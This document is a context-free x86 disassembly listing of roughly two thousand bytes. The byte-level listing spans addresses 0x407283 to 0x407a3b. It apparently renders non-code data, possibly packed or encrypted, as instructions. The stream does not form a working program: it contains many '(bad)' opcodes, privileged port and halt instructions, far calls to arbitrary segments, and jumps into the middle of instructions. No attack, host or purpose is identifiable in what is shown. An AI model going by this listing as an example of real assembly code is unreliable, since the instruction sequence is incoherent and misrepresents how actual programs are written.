  407283:	and    bl,BYTE PTR [edx]
  407285:	xchg   edx,eax
  407286:	mov    bl,0xd0
  407288:	outs   dx,BYTE PTR ds:[esi]
  407289:	or     DWORD PTR [edi-0xecba7a7],0x51
  407290:	hlt    
  407291:	mov    al,0x9d
  407293:	or     al,0x22
  407295:	iret   
  407296:	or     ebx,ecx
  407298:	iret   
  407299:	in     eax,dx
  40729a:	inc    edi
  40729b:	aaa    
  40729c:	scas   al,BYTE PTR es:[edi]
  40729d:	popf   
  40729e:	push   esi
  40729f:	jle    0x4072c2
  4072a1:	icebp  
  4072a2:	es pop esi
  4072a4:	jno    0x407266
  4072a6:	dec    esp
  4072a7:	xor    bl,dh
  4072a9:	lods   eax,DWORD PTR ds:[esi]
  4072aa:	retf   
  4072ab:	popa   
  4072ac:	xor    cl,0x9d
  4072af:	adc    DWORD PTR [eax-0x52],0x18
  4072b3:	or     BYTE PTR [ebx],cl
  4072b5:	cmp    dl,BYTE PTR [edi-0x2c]
  4072b8:	inc    ecx
  4072b9:	ror    BYTE PTR [ebx-0x7fd26f71],0x96
  4072c0:	pop    ss
  4072c1:	mov    ch,0xc0
  4072c3:	add    dl,BYTE PTR ds:0x63989a27
  4072c9:	add    cl,BYTE PTR [edi+eax*1+0x29b63920]
  4072d0:	push   0x5d
  4072d2:	shl    DWORD PTR [eax],0x2d
  4072d5:	jae    0x40731a
  4072d7:	inc    eax
  4072d8:	sbb    dl,BYTE PTR [edx+eiz*8]
  4072db:	ficom  DWORD PTR [ebp+0x77]
  4072de:	push   es
  4072df:	(bad)  
  4072e0:	popa   
  4072e1:	mov    al,ds:0x6c3185e9
  4072e6:	fnstenv [edx+0x509130b6]
  4072ec:	sbb    al,BYTE PTR [edi]
  4072ee:	sub    al,0x42
  4072f0:	in     al,0x1f
  4072f2:	inc    esp
  4072f3:	jne    0x407279
  4072f5:	mov    esp,0xaaf29719
  4072fa:	ror    DWORD PTR [ebx],1
  4072fc:	cwde   
  4072fd:	loope  0x40729f
  4072ff:	jecxz  0x40732b
  407301:	nop
  407302:	cmp    eax,DWORD PTR [edx+0x55]
  407305:	sti    
  407306:	add    bh,BYTE PTR [ecx+0x7]
  407309:	stc    
  40730a:	or     dh,BYTE PTR [ecx]
  40730c:	sub    eax,0x45
  40730f:	fbstp  TBYTE PTR ds:0x55d61c79
  407315:	repnz push ss
  407317:	or     BYTE PTR [edx],bl
  407319:	pop    edx
  40731a:	cmp    BYTE PTR [esi+ecx*4+0x10],cl
  40731e:	jle    0x407346
  407320:	cmp    DWORD PTR [eax-0x45],edi
  407323:	push   ecx
  407324:	push   eax
  407325:	test   al,0x8a
  407327:	mov    esp,0xe256d058
  40732c:	add    al,dh
  40732e:	sbb    eax,0x88734ed6
  407333:	xchg   ecx,eax
  407334:	shr    BYTE PTR [edx],0x34
  407337:	add    BYTE PTR [ebx],al
  407339:	xchg   esi,eax
  40733a:	(bad)  
  40733b:	outs   dx,DWORD PTR ds:[esi]
  40733c:	and    eax,0xb5a83d5d
  407341:	js     0x407304
  407343:	dec    edi
  407344:	push   edi
  407345:	popf   
  407346:	and    cl,BYTE PTR [edi]
  407348:	push   edx
  407349:	leave  
  40734a:	sbb    ecx,ecx
  40734c:	inc    ebx
  40734d:	sub    bh,BYTE PTR [edi+0x1c]
  407350:	mov    ds:0x2d89f625,al
  407355:	inc    ecx
  407356:	pop    esi
  407357:	cmp    dh,BYTE PTR [ecx-0x74d22a3f]
  40735d:	and    ecx,DWORD PTR [eax+0x70325d39]
  407363:	push   edi
  407364:	xchg   edi,eax
  407365:	dec    edx
  407366:	push   0xffffffd4
  407368:	lahf   
  407369:	(bad)  
  40736a:	hlt    
  40736b:	popf   
  40736c:	pushf  
  40736d:	or     eax,0x936345c2
  407372:	push   0x68
  407374:	dec    edi
  407375:	xchg   dl,dh
  407377:	inc    ebx
  407378:	and    eax,0xc5b98672
  40737d:	push   ss
  40737e:	jmp    0x2aad21b9
  407383:	cmp    ecx,ebx
  407385:	push   ecx
  407386:	jne    0x4073fa
  407388:	pop    eax
  407389:	je     0x40739d
  40738b:	add    edi,ebx
  40738d:	jl     0x4073e5
  40738f:	popa   
  407390:	call   0xbd77:0xe5afb25f
  407397:	cld    
  407398:	into   
  407399:	repnz mov bl,0x1
  40739c:	fimul  WORD PTR [esi+eiz*4-0x276fae03]
  4073a3:	xchg   ebp,eax
  4073a4:	inc    esp
  4073a5:	mov    al,0x61
  4073a7:	call   0xf6180ff9
  4073ac:	bound  ecx,QWORD PTR [esi+ecx*4]
  4073af:	test   ecx,edx
  4073b1:	cwde   
  4073b2:	push   ebx
  4073b3:	(bad)  
  4073b4:	mov    eax,ds:0x72da6942
  4073b9:	mov    ds:0x157d7acc,eax
  4073be:	xchg   ecx,eax
  4073bf:	pop    ebp
  4073c0:	jnp    0x40735a
  4073c2:	dec    eax
  4073c3:	addr16 sar al,cl
  4073c6:	ret    0x562f
  4073c9:	fild   WORD PTR [esi+0x5b]
  4073cc:	cwde   
  4073cd:	jle    0x407413
  4073cf:	imul   esp,DWORD PTR [esi-0x22],0x7a665b4
  4073d6:	jg     0x4073ad
  4073d8:	xchg   DWORD PTR [ebp-0x420b9484],esp
  4073de:	jne    0x407419
  4073e0:	repnz pusha 
  4073e2:	mov    DWORD PTR [ecx-0x1e281454],eax
  4073e8:	inc    esi
  4073e9:	adc    al,0x86
  4073eb:	bound  ebp,QWORD PTR [eax]
  4073ed:	into   
  4073ee:	xor    esp,edx
  4073f0:	cmp    BYTE PTR [ebx+0x3efc23],dl
  4073f6:	loope  0x40739f
  4073f8:	ins    BYTE PTR es:[edi],dx
  4073f9:	pushf  
  4073fa:	into   
  4073fb:	inc    BYTE PTR [ecx]
  4073fd:	rcl    DWORD PTR [ebx+0x3f],cl
  407400:	stos   DWORD PTR es:[edi],eax
  407401:	mov    edi,0x8d377c45
  407406:	mov    ss,WORD PTR fs:[ecx-0x2]
  40740a:	mov    al,ds:0xdc8e0ba
  40740f:	shl    dl,0x5a
  407412:	stc    
  407413:	hlt    
  407414:	(bad)  
  407415:	mov    eax,ds:0x18adcc83
  40741a:	mov    al,0xea
  40741c:	shl    DWORD PTR [edx+0x54fdd50c],1
  407422:	xchg   DWORD PTR [edi+esi*8-0x554580ff],ebp
  407429:	cmp    BYTE PTR [ebp+0x5d],0xf8
  40742d:	sub    eax,0x93404d21
  407432:	xchg   esi,eax
  407433:	mov    al,0xcb
  407435:	rol    BYTE PTR [ecx+0x2c7f97ff],1
  40743b:	call   0x3123:0xdbd4f4ec
  407442:	inc    edi
  407443:	inc    ebp
  407445:	mov    dl,0xe8
  407447:	xor    eax,ebp
  407449:	outs   dx,BYTE PTR ds:[esi]
  40744a:	rol    BYTE PTR [esi+0x5f],0xdd
  40744e:	leave  
  40744f:	cmp    eax,0x6536fe0d
  407454:	dec    ebx
  407455:	xchg   DWORD PTR [ecx+0xb],esp
  407458:	xchg   ebp,eax
  407459:	out    dx,eax
  40745a:	add    eax,0x13ab1f24
  40745f:	pop    ebp
  407460:	ret    
  407461:	dec    ebp
  407462:	mov    bh,0x88
  407464:	ret    
  407465:	push   esi
  407466:	fucomi st,st(1)
  407468:	dec    eax
  407469:	lods   eax,DWORD PTR ds:[esi]
  40746a:	fsubr  QWORD PTR [ecx]
  40746c:	ret    0x5bce
  40746f:	push   eax
  407470:	cmp    ecx,ebx
  407472:	xchg   ecx,eax
  407473:	hlt    
  407474:	pcmpgtb mm3,QWORD PTR [edi+0x56]
  407478:	call   0xd1ac2302
  40747d:	inc    edi
  40747e:	(bad)
  407482:	and    BYTE PTR [esi+0x28dc956f],bl
  407488:	mov    al,0x7f
  40748a:	loope  0x407488
  40748c:	inc    edx
  40748d:	call   0xdca7:0x77789d24
  407494:	int3   
  407495:	jnp    0x407479
  407497:	and    DWORD PTR [esi+esi*2+0x10984ba1],ebx
  40749e:	jns    0x4074fd
  4074a0:	mov    esp,0x315b9406
  4074a5:	test   al,0xb1
  4074a7:	xor    DWORD PTR [ecx-0x69],edx
  4074aa:	sub    ah,ah
  4074ac:	ins    BYTE PTR es:[edi],dx
  4074ad:	push   ecx
  4074ae:	ret    0x429d
  4074b1:	sub    cl,BYTE PTR [edi+ebp*1]
  4074b4:	(bad)  
  4074b5:	lahf   
  4074b6:	es mov bl,0xd1
  4074b9:	js     0x407441
  4074bb:	(bad)  
  4074bc:	out    dx,eax
  4074bd:	mov    bh,BYTE PTR [ebx-0x5]
  4074c0:	sub    DWORD PTR [ebx+edi*8+0x6b],0x4ab16ae0
  4074c8:	adc    al,0x7e
  4074ca:	pusha  
  4074cb:	cwde   
  4074cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074cd:	sbb    ch,ah
  4074cf:	mov    edx,0x573d58f0
  4074d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d5:	scas   al,BYTE PTR es:[edi]
  4074d6:	cli    
  4074d7:	inc    edi
  4074d8:	scas   eax,DWORD PTR es:[edi]
  4074d9:	jp     0x40753e
  4074db:	cdq    
  4074dc:	ins    DWORD PTR es:[edi],dx
  4074dd:	stos   BYTE PTR es:[edi],al
  4074de:	dec    ecx
  4074df:	in     eax,0xa9
  4074e1:	jg     0x40752d
  4074e3:	addr16 and al,0xac
  4074e6:	sbb    eax,0x3ea475ba
  4074eb:	repz repz push ds
  4074ee:	outs   dx,DWORD PTR ds:[esi]
  4074ef:	mov    dh,0xeb
  4074f1:	imul   ebx,DWORD PTR ds:0xba0899ce,0xe75ebebf
  4074fb:	fnsave [esi-0x66210fbe]
  407501:	or     al,0x79
  407503:	sub    ecx,DWORD PTR [edx-0x50]
  407506:	sar    DWORD PTR [edi],0xb2
  407509:	mov    DWORD PTR [esi-0x6],edx
  40750c:	mov    ebp,0xf88231f2
  407511:	nop
  407512:	stos   BYTE PTR es:[edi],al
  407513:	inc    ebx
  407514:	jle    0x407575
  407516:	mov    bh,0xbc
  407518:	iret   
  407519:	or     eax,edi
  40751b:	mov    bh,0xd
  40751d:	push   ebx
  40751e:	stos   BYTE PTR es:[edi],al
  40751f:	mov    al,ds:0x2f5840dc
  407524:	cld    
  407525:	into   
  407526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407527:	jmp    0x407537
  407529:	test   DWORD PTR [esi],esi
  40752b:	arpl   sp,di
  40752d:	or     al,0x7e
  40752f:	mov    ah,0xc4
  407531:	in     eax,dx
  407532:	mov    WORD PTR [ebx+0x64bf916b],es
  407538:	sti    
  407539:	sbb    BYTE PTR [edx+0x35e7c382],cl
  40753f:	ins    DWORD PTR es:[edi],dx
  407540:	or     ah,bl
  407542:	jb     0x4075a1
  407544:	pop    ds
  407545:	in     al,0x79
  407547:	xchg   edx,eax
  407548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407549:	inc    esp
  40754a:	stos   BYTE PTR es:[edi],al
  40754b:	push   0x61
  40754d:	loope  0x40756d
  40754f:	int    0x4a
  407551:	push   esi
  407552:	xchg   esi,eax
  407553:	add    al,0xb9
  407555:	outs   dx,BYTE PTR ds:[esi]
  407556:	adc    eax,0xc7352ed1
  40755b:	pusha  
  40755c:	pminub mm2,QWORD PTR [eax]
  40755f:	adc    dl,BYTE PTR [eax+0x40529730]
  407565:	pusha  
  407566:	mov    dh,BYTE PTR [edi-0x5a8c729f]
  40756c:	jle    0x4075ed
  40756e:	sahf   
  40756f:	pop    esp
  407570:	jmp    0x4074f3
  407572:	mov    ds:0xe7a86a66,eax
  407577:	(bad)  
  407579:	cld    
  40757a:	mov    ebp,0xb6f8c675
  40757f:	ret    
  407580:	pusha  
  407581:	xchg   DWORD PTR [esi+0x4a],ebx
  407584:	dec    ecx
  407585:	jae    0x40751b
  407587:	dec    ebx
  407589:	loopne 0x4075f2
  40758b:	sub    bh,BYTE PTR [esi]
  40758d:	sub    bl,BYTE PTR [esi-0x2069164c]
  407593:	jg     0x4075a9
  407595:	sbb    bl,BYTE PTR [edx+0x5e]
  407598:	lods   al,BYTE PTR ds:[esi]
  407599:	daa    
  40759a:	push   ebp
  40759b:	(bad)  
  40759c:	inc    edi
  40759d:	repnz std 
  40759f:	and    dh,BYTE PTR [eax-0x3d]
  4075a2:	mov    al,ds:0xa17b5d47
  4075a7:	cmp    bl,BYTE PTR [esi]
  4075a9:	fwait
  4075aa:	std    
  4075ab:	dec    ebp
  4075ac:	dec    edx
  4075ad:	sar    DWORD PTR [edi+0x40],1
  4075b0:	xor    eax,0x6c00db8b
  4075b5:	cmc    
  4075b6:	ins    DWORD PTR es:[edi],dx
  4075b7:	mov    eax,0xea6cc905
  4075bc:	pop    esp
  4075bd:	pop    eax
  4075be:	repnz fdivrp st(6),st
  4075c1:	cmp    DWORD PTR [ecx+ecx*8-0x233b7ca5],ecx
  4075c8:	fwait
  4075c9:	mov    dh,0x48
  4075cb:	cmp    eax,0x2ca464b3
  4075d0:	sub    eax,0xd1f59ae9
  4075d5:	push   edi
  4075d6:	out    0x3d,al
  4075d8:	out    0xd8,al
  4075da:	lods   eax,DWORD PTR ds:[esi]
  4075db:	ss ja  0x4075dc
  4075de:	dec    edi
  4075df:	fidiv  DWORD PTR [edi+edx*8]
  4075e2:	add    DWORD PTR [ebx],ecx
  4075e4:	adc    DWORD PTR [eax-0x13],edi
  4075e7:	out    0x67,eax
  4075e9:	test   al,0xcd
  4075eb:	fistp  DWORD PTR [edi]
  4075ed:	add    eax,0xf84e39d9
  4075f2:	cmp    DWORD PTR [esi],edx
  4075f4:	ss push cs
  4075f6:	add    al,0xdd
  4075f8:	into   
  4075f9:	sbb    dh,BYTE PTR [esi]
  4075fb:	pop    edx
  4075fc:	dec    esp
  4075fd:	cmp    edi,DWORD PTR [edx-0xf9f74ae]
  407603:	pop    ebx
  407604:	jmp    0x40764c
  407606:	pop    esi
  407607:	cwde   
  407608:	fistp  DWORD PTR [edi-0xd]
  40760b:	jl     0x4075c0
  40760d:	int    0x78
  40760f:	xchg   edi,eax
  407610:	je     0x407675
  407612:	push   edi
  407613:	(bad)  
  407615:	in     eax,0xea
  407617:	repnz inc edi
  407619:	mov    esi,eax
  40761b:	in     al,dx
  40761c:	and    DWORD PTR [esi],ebx
  40761e:	rol    DWORD PTR [ecx-0x8],cl
  407621:	dec    edx
  407622:	pop    edx
  407623:	stos   DWORD PTR es:[edi],eax
  407624:	repnz lods al,BYTE PTR ds:[esi]
  407626:	lahf   
  407627:	fs cs jb 0x407611
  40762b:	push   ebx
  40762c:	rcl    eax,cl
  40762e:	out    dx,al
  40762f:	aam    0x11
  407631:	scas   eax,DWORD PTR es:[edi]
  407632:	imul   edi,DWORD PTR [edx+eax*4+0x2bb3d25f],0xe
  40763a:	scas   al,BYTE PTR es:[edi]
  40763b:	shr    DWORD PTR [ebx+0x6a7dae3f],cl
  407641:	mov    ds:0x9c262f5d,al
  407646:	adc    dh,dl
  407648:	(bad)  
  40764a:	dec    edx
  40764b:	xor    DWORD PTR [esi],esi
  40764d:	xchg   eax,esp
  40764f:	test   BYTE PTR [edx],bh
  407651:	repnz pop esi
  407653:	mov    dl,bl
  407655:	dec    edi
  407656:	or     eax,0xef1fdfaf
  40765b:	ins    BYTE PTR es:[edi],dx
  40765c:	inc    esp
  40765d:	inc    esp
  40765e:	adc    ebp,DWORD PTR [ebx-0x59a33960]
  407664:	bound  esi,QWORD PTR [esi-0x14]
  407667:	(bad)  
  407668:	repz enter 0xac81,0x52
  40766d:	xor    eax,0x4da8b34b
  407672:	jp     0x407613
  407674:	test   ebp,0xbe8ee36a
  40767a:	cmp    al,0xc9
  40767c:	popa   
  40767d:	push   esi
  40767e:	push   esi
  40767f:	call   0xbad6e006
  407684:	sub    BYTE PTR [esi-0x4a],0x0
  407688:	jp     0x40762e
  40768a:	adc    al,0xa0
  40768d:	pop    esp
  40768e:	mov    ds:0x1b842139,al
  407693:	inc    eax
  407694:	popf   
  407695:	and    ebx,DWORD PTR [esi+0x72]
  407698:	icebp  
  407699:	out    0x2b,eax
  40769b:	xlat   BYTE PTR ds:[ebx]
  40769c:	std    
  40769d:	xchg   DWORD PTR [edx],ebp
  40769f:	js     0x407652
  4076a1:	jl     0x407669
  4076a3:	mov    eax,0xedaee39d
  4076a8:	ins    DWORD PTR es:[edi],dx
  4076a9:	inc    edx
  4076aa:	int    0xeb
  4076ac:	ins    BYTE PTR es:[edi],dx
  4076ad:	xor    eax,0x70c1e0f1
  4076b2:	push   edi
  4076b3:	and    BYTE PTR [ebp-0x36],ch
  4076b6:	test   BYTE PTR [edx+0x51],ch
  4076b9:	test   al,0x35
  4076bb:	lock mov esp,0xcb3fa49f
  4076c1:	push   ebx
  4076c2:	push   ebx
  4076c3:	(bad)  
  4076c4:	sbb    ebx,edx
  4076c6:	push   ebp
  4076c7:	add    bh,bl
  4076c9:	mov    cl,0xd2
  4076cb:	or     BYTE PTR [edx+ebp*4+0x12],dh
  4076cf:	mov    ds,WORD PTR [ecx-0x2938b784]
  4076d5:	shr    eax,cl
  4076d7:	lods   eax,DWORD PTR ds:[esi]
  4076d8:	fs pop edx
  4076da:	outs   dx,BYTE PTR fs:[esi]
  4076dc:	adc    al,ch
  4076de:	pop    edi
  4076df:	push   esp
  4076e0:	mov    DWORD PTR [eax+0x63],ebp
  4076e3:	inc    ecx
  4076e4:	int    0xaf
  4076e6:	das    
  4076e7:	aaa    
  4076e8:	jle    0x40772a
  4076ea:	fcomip st,st(3)
  4076ec:	pop    ecx
  4076ed:	icebp  
  4076ee:	xor    BYTE PTR [eax],0x71
  4076f1:	mov    ah,0x69
  4076f3:	ret    0x4751
  4076f6:	or     al,0xea
  4076f8:	addr16 popa 
  4076fa:	jbe    0x40768b
  4076fc:	mov    ch,BYTE PTR [ebx]
  4076fe:	sub    BYTE PTR [ecx],ch
  407700:	retf   
  407701:	std    
  407702:	(bad)  
  407703:	loop   0x4076db
  407705:	or     al,0x64
  407707:	psubq  mm2,QWORD PTR [edi]
  40770a:	addr16 (bad) 
  40770c:	pop    edx
  40770d:	test   BYTE PTR [edi],al
  40770f:	sbb    al,0x14
  407711:	imul   ebx,DWORD PTR ds:0xcdb5844e,0xffffffcd
  407718:	adc    BYTE PTR ds:0x294a541c,bh
  40771e:	add    DWORD PTR [edi],edi
  407720:	xlat   BYTE PTR ds:[ebx]
  407721:	jo     0x4076f8
  407723:	in     eax,0xa8
  407725:	addr16 mov dh,bh
  407728:	fisub  WORD PTR [eax-0x506272df]
  40772e:	je     0x40778f
  407730:	xor    al,0x7
  407732:	xchg   DWORD PTR [esi-0x68],esp
  407735:	adc    ah,BYTE PTR [ebx]
  407737:	inc    ebp
  407738:	fnstenv [ebp-0x480f756a]
  40773e:	cdq    
  40773f:	cmp    esp,DWORD PTR [eax+edi*1+0x4d6b35fc]
  407746:	outs   dx,DWORD PTR ds:[esi]
  407747:	sub    BYTE PTR [esp+ebp*2],bh
  40774a:	xor    eax,0x86359b28
  40774f:	cmp    al,0x50
  407751:	mov    al,0x34
  407753:	cli    
  407754:	shl    DWORD PTR [ecx],cl
  407756:	inc    ebp
  407757:	lods   al,BYTE PTR ds:[esi]
  407758:	popa   
  407759:	ss ins DWORD PTR es:[edi],dx
  40775b:	sub    ah,dl
  40775d:	inc    edx
  40775e:	mov    eax,0x24bb0f58
  407763:	rol    BYTE PTR [esi-0x5a3bd0df],0x6b
  40776a:	adc    edi,esp
  40776c:	jae    0x4076f6
  40776e:	sti    
  40776f:	sub    BYTE PTR [edi+esi*1+0x374393be],ah
  407776:	add    eax,DWORD PTR [ebp+0x66e81037]
  40777c:	mov    ah,0xb7
  40777e:	repz dec esi
  407780:	dec    ecx
  407781:	imul   ebx,DWORD PTR [edi+0xab83149],0x7d6dacef
  40778b:	xor    edi,DWORD PTR [esi+ebp*8]
  40778e:	xchg   edx,eax
  40778f:	cvtps2pi mm2,QWORD PTR [ebx+ebp*4]
  407793:	sub    al,0xa1
  407795:	adc    DWORD PTR [edi+0x50f4af8a],edi
  40779b:	mov    edi,0xbcc521ba
  4077a0:	stos   DWORD PTR es:[edi],eax
  4077a1:	stos   BYTE PTR es:[edi],al
  4077a2:	dec    esp
  4077a3:	mov    ebx,0xeac7944d
  4077a8:	jl     0x40774b
  4077aa:	push   cs
  4077ab:	adc    eax,0xe2bc356b
  4077b0:	push   ecx
  4077b1:	cld    
  4077b2:	jmp    0x40777c
  4077b4:	jge    0x407744
  4077b6:	jle    0x4077b5
  4077b8:	add    ebp,DWORD PTR [esi]
  4077ba:	dec    edx
  4077bb:	xchg   ecx,eax
  4077bc:	add    cl,ch
  4077be:	dec    esi
  4077bf:	fisttp QWORD PTR [ebp+0x38b90be7]
  4077c5:	iret   
  4077c6:	pop    ss
  4077c7:	and    cl,BYTE PTR [esi-0x6c65b366]
  4077cd:	pop    eax
  4077ce:	adc    bh,bl
  4077d0:	out    0xa6,eax
  4077d2:	imul   eax,DWORD PTR [edx],0xd07f04c6
  4077d8:	and    DWORD PTR [ecx-0x793b20d0],0xba33d35b
  4077e2:	fcmovnbe st,st(1)
  4077e4:	mov    bl,0xbb
  4077e6:	mov    dl,0xc3
  4077e8:	jmp    0x4077c7
  4077ea:	cmp    al,0xc6
  4077ec:	repz push es
  4077ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ef:	jno    0x407868
  4077f1:	clc    
  4077f2:	mov    al,ds:0x50b65801
  4077f7:	sti    
  4077f8:	xor    al,0xbd
  4077fa:	jb     0x40787a
  4077fc:	out    0xe5,eax
  4077fe:	mov    ds:0xb47153d4,eax
  407803:	sub    al,0x60
  407805:	or     eax,DWORD PTR [ebx+esi*2+0x3c]
  407809:	cmp    al,0x6b
  40780b:	inc    ecx
  40780c:	cmp    bl,BYTE PTR [edx]
  40780e:	sub    ebp,0xf8bc5bfb
  407814:	fstp   DWORD PTR [esi]
  407816:	jmp    0x3e090072
  40781b:	or     eax,0xa7d765b9
  407820:	mov    ecx,0x755d0f33
  407825:	les    ebp,FWORD PTR [ebp-0x1faa8b7a]
  40782b:	cmp    ebx,DWORD PTR [edx-0x61]
  40782e:	mov    edx,0xf5936ed4
  407833:	inc    ebp
  407834:	int    0x92
  407836:	jmp    0x2ced:0xa5dcf7dc
  40783d:	rol    esp,0x5
  407840:	mov    ecx,0x2c97c5c7
  407845:	in     eax,0xe6
  407847:	sbb    dl,BYTE PTR [esi+0x30ce0525]
  40784d:	les    esi,FWORD PTR [eax]
  40784f:	push   edx
  407850:	and    al,0x27
  407852:	fcom   QWORD PTR [eax-0x3535e003]
  407858:	or     al,0xd5
  40785a:	mov    eax,0x7705d2b7
  40785f:	not    DWORD PTR [edi+eax*8+0x62]
  407863:	add    DWORD PTR [esi+edi*8],ebx
  407866:	adc    al,0xd5
  407868:	aaa    
  407869:	pop    eax
  40786a:	es cmp cl,BYTE PTR fs:[edx+0x69982228]
  407872:	cmp    ebx,DWORD PTR [edi+0xd]
  407875:	imul   edx,esp,0x0
  407878:	mov    al,ds:0x289bd859
  40787d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40787e:	mov    esi,0x98f7e742
  407883:	mov    edi,0x4f29edb7
  407888:	and    al,0xa4
  40788a:	(bad)  
  40788b:	outs   dx,DWORD PTR ds:[esi]
  40788c:	jmp    0x3b1b:0x857fef6a
  407893:	add    DWORD PTR [esi-0x9],0x7e1fbbc7
  40789a:	xor    ch,ah
  40789c:	bound  edx,QWORD PTR ds:0x8aac1dfc
  4078a2:	push   ebx
  4078a3:	jg     0x40790e
  4078a5:	and    eax,ecx
  4078a7:	xchg   esi,eax
  4078a8:	js     0x40790c
  4078aa:	sub    al,0x53
  4078ac:	push   0x42
  4078ae:	add    DWORD PTR [ebp+0x14],esi
  4078b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078b2:	sub    bh,BYTE PTR [ebp+0x12]
  4078b5:	or     eax,0x3fb898e1
  4078ba:	jb     0x407914
  4078bc:	xchg   esi,eax
  4078bd:	ret    0x5dc1
  4078c0:	popa   
  4078c1:	iret   
  4078c2:	dec    edx
  4078c3:	push   0x750fa557
  4078c8:	lods   al,BYTE PTR ds:[esi]
  4078c9:	stos   DWORD PTR es:[edi],eax
  4078ca:	enter  0x9870,0x9c
  4078ce:	pcmpgtd mm7,QWORD PTR [esi+0x7848b0d5]
  4078d5:	aam    0xe6
  4078d7:	push   ds
  4078d8:	add    dh,cl
  4078da:	adc    al,0x31
  4078dc:	pusha  
  4078dd:	add    eax,0x4eb4f3c7
  4078e2:	pop    esp
  4078e3:	aam    0x9f
  4078e5:	fimul  WORD PTR [ebp+0x55]
  4078e8:	mov    ah,0xbe
  4078ea:	xor    BYTE PTR [eax],cl
  4078ec:	xchg   edi,eax
  4078ed:	les    eax,FWORD PTR [eax+0x1fe45c5d]
  4078f3:	adc    eax,0xed8e5305
  4078f8:	mov    WORD PTR [eax],ds
  4078fa:	lods   eax,DWORD PTR ds:[esi]
  4078fb:	retf   0xc53c
  4078fe:	sar    DWORD PTR [ecx],0x55
  407901:	pop    edi
  407902:	shl    DWORD PTR [ebp+0x4f80626c],cl
  407908:	xlat   BYTE PTR cs:[ebx]
  40790a:	or     cl,BYTE PTR [edi-0x55832218]
  407910:	test   eax,0xe7083a09
  407915:	mov    ebx,0x4a7bf2a4
  40791a:	add    dh,bh
  40791c:	inc    esi
  40791d:	push   0x71a395ed
  407922:	stc    
  407923:	imul   edi,DWORD PTR [ecx+0x107627f8],0x24c01db9
  40792d:	rcr    esp,1
  40792f:	cmp    cl,ah
  407931:	dec    edx
  407932:	xor    DWORD PTR [esp+eiz*2+0x3689c29],0xffffff8d
  40793a:	pop    esp
  40793b:	xor    al,0xa6
  40793d:	ret    
  40793e:	mov    edi,0x25d6c32d
  407943:	xchg   edx,eax
  407944:	inc    esi
  407945:	xchg   ecx,eax
  407946:	leave  
  407947:	dec    eax
  407948:	in     al,0x1d
  40794a:	pop    ebp
  40794b:	xchg   esi,eax
  40794c:	jno    0x4078e2
  40794e:	sub    al,bh
  407950:	mov    dl,0x55
  407952:	mov    bl,0x79
  407954:	test   al,0x30
  407956:	mov    BYTE PTR [esi+0x17ff581d],dl
  40795c:	jecxz  0x40792d
  40795e:	mov    eax,0x8f93a7da
  407963:	push   edi
  407964:	fwait
  407965:	and    edi,0x63
  407968:	mov    eax,ds:0x5f9ff248
  40796d:	inc    esi
  40796e:	hlt    
  40796f:	pop    eax
  407970:	cmp    cl,ah
  407972:	ja     0x4079e6
  407974:	sbb    eax,0xb67a6944
  407979:	mov    BYTE PTR [edx+edi*2+0x75],bh
  40797d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797e:	push   0x50
  407980:	pop    ebp
  407981:	mov    ah,0x4f
  407983:	jge    0x4079c2
  407985:	dec    eax
  407986:	sti    
  407987:	les    ebp,FWORD PTR [esi+0x49]
  40798a:	pop    edi
  40798b:	adc    edi,DWORD PTR fs:[esi+0x4a]
  40798f:	std    
  407990:	add    eax,DWORD PTR [edi]
  407992:	inc    ecx
  407993:	mov    eax,ds:0x4c403818
  407998:	and    BYTE PTR [ecx+0x79],dh
  40799b:	fnstcw WORD PTR [ebx+0x63]
  40799e:	mov    ebx,0xf3355831
  4079a3:	xor    al,0xca
  4079a5:	mov    ecx,0x3e5cc0be
  4079aa:	cmc    
  4079ab:	adc    edi,DWORD PTR [ebp-0x52]
  4079ae:	push   esp
  4079af:	fwait
  4079b0:	mov    edi,0x6c31cacb
  4079b5:	dec    esi
  4079b6:	mov    cl,0xac
  4079b8:	jmp    0x4a32ce92
  4079bd:	mov    bh,0xb0
  4079bf:	inc    edi
  4079c0:	mov    eax,ds:0x5242d4fb
  4079c5:	xlat   BYTE PTR ds:[ebx]
  4079c6:	pop    esp
  4079c7:	outs   dx,DWORD PTR ds:[esi]
  4079c8:	add    BYTE PTR [eax],bl
  4079ca:	xchg   DWORD PTR [edx+eiz*4],eax
  4079cd:	cmp    edi,0x3a52b1c9
  4079d3:	sbb    bh,BYTE PTR [edx+0x50915c4c]
  4079d9:	outs   dx,BYTE PTR ds:[esi]
  4079da:	add    ebx,DWORD PTR [eax]
  4079dc:	push   eax
  4079dd:	push   ss
  4079de:	(bad)  
  4079e2:	inc    eax
  4079e3:	aad    0xd7
  4079e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e6:	push   ss
  4079e7:	setno  BYTE PTR [esi+0x7b]
  4079eb:	test   al,0xaa
  4079ed:	lahf   
  4079ee:	xchg   DWORD PTR [edi-0xb],esi
  4079f1:	mov    BYTE PTR [ecx],0xc2
  4079f4:	and    esp,DWORD PTR [edx-0x3f]
  4079f7:	loop   0x40797e
  4079f9:	jbe    0x40799a
  4079fb:	popf   
  4079fc:	in     al,0x1a
  4079fe:	add    dl,al
  407a00:	pop    ebx
  407a01:	in     eax,dx
  407a02:	xchg   DWORD PTR ds:0xac108e9a,esp
  407a08:	cmp    BYTE PTR [ebx+0x63b5c27f],bh
  407a0e:	xor    dl,BYTE PTR [ebp+0x22]
  407a11:	dec    ebx
  407a12:	rsm    
  407a14:	jl     0x4079dc
  407a16:	inc    ebx
  407a17:	out    0x65,eax
  407a19:	add    BYTE PTR [eax],ah
  407a1b:	out    0x40,al
  407a1d:	fdiv   QWORD PTR [edx]
  407a1f:	push   ecx
  407a20:	ret    0x4086
  407a23:	xchg   edx,eax
  407a24:	in     al,0xbb
  407a26:	xlat   BYTE PTR ds:[ebx]
  407a27:	mov    eax,ds:0x34c639b7
  407a2c:	stos   BYTE PTR es:[edi],al
  407a2d:	dec    ebx
  407a2e:	mov    ecx,0xb79ad2de
  407a33:	es hlt 
  407a35:	mov    ecx,0xaca9bae3
  407a3a:	aas    
  407a3b:	not    BYTE PTR [esi-0x27120826]
